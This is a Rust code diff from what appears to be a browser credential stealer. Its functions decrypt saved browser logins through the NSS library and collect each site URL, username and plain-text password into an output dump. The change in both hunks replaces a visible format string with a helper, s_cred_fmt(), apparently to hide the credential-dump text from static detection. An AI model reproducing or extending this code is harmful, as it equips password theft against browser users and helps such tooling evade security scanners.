@@ -160,13 +160,15 @@ fn extract_from_json(nss_lib: &libloading::Library, logins_path: &Path) -> Optio
         let password = decrypt_nss_value(nss_lib, enc_password)
             .unwrap_or_else(|| "[decryption failed]".to_string());
 
-        output.push_str(&format!(
-            "URL: {}\nUsername: {}\nPassword: {}\n{}\n",
-            hostname,
-            username,
-            password,
-            "-".repeat(50)
-        ));
+        {
+            let fmt = s_cred_fmt();
+            let entry = fmt
+                .replacen("{}", hostname, 1)
+                .replacen("{}", &username, 1)
+                .replacen("{}", &password, 1)
+                .replacen("{}", &"-".repeat(50), 1);
+            output.push_str(&entry);
+        }
     }
 
     if output.is_empty() { None } else { Some(output) }
@@ -203,13 +205,15 @@ fn extract_logins_from_sqlite(nss_lib: &libloading::Library, conn: &Connection) 
             String::new()
         };
 
-        output.push_str(&format!(
-            "URL: {}\nUsername: {}\nPassword: {}\n{}\n",
-            hostname,
-            username,
-            password,
-            "-".repeat(50)
-        ));
+        {
+            let fmt = s_cred_fmt();
+            let entry = fmt
+                .replacen("{}", &hostname, 1)
+                .replacen("{}", &username, 1)
+                .replacen("{}", &password, 1)
+                .replacen("{}", &"-".repeat(50), 1);
+            output.push_str(&entry);
+        }
     }
 
     if output.is_empty() { None } else { Some(output) }
